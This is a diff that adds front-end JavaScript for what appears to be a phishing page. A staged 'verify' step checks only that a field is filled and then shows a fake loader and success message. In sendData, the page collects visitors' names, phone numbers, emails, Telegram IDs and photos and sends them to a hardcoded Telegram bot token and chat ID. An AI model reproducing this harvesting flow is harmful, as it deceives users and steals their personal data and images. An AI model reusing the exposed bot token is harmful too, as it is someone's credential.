@@ -1,0 +1,74 @@
+// 🔥 Startup animation (6 sec)
+window.onload = function(){
+  setTimeout(()=>{
+    let startup = document.getElementById("startup");
+    startup.style.transition = "1s";
+    startup.style.opacity = "0";
+
+    setTimeout(()=>{
+      startup.style.display = "none";
+    },1000);
+
+  },6000);
+};
+
+// ✅ Verify (only empty check)
+function verify(){
+  let tgid = document.getElementById("tgid").value.trim();
+  let loader = document.getElementById("loader");
+  let success = document.getElementById("successBox");
+
+  if(tgid === ""){
+    alert("Please enter TG ID ⚠️");
+    return;
+  }
+
+  loader.style.display="block";
+
+  setTimeout(()=>{
+    loader.style.display="none";
+    success.style.display="block";
+
+    setTimeout(()=>{
+      success.style.display="none";
+
+      // Slide form
+      document.getElementById("formSection").classList.add("active");
+
+    },2000);
+
+  },4000);
+}
+
+// 🚀 Telegram send
+function sendData(){
+  let name = document.getElementById("name").value;
+  let number = document.getElementById("number").value;
+  let email = document.getElementById("email").value;
+  let tg = document.getElementById("tg").value;
+  let file = document.getElementById("photo").files[0];
+
+  let token = "8783457685:AAHQxxvEPwa35CY0CKpmsZ42TjRAzIuWtHo";
+  let chat_id = "8783457685";
+
+  let text = `🔥 New User:
+Name: ${name}
+Number: ${number}
+Email: ${email}
+TG: ${tg}`;
+
+  fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`);
+
+  if(file){
+    let formData = new FormData();
+    formData.append("chat_id", chat_id);
+    formData.append("photo", file);
+
+    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+      method:"POST",
+      body:formData
+    });
+  }
+
+  alert("Sent ✅");
+      }
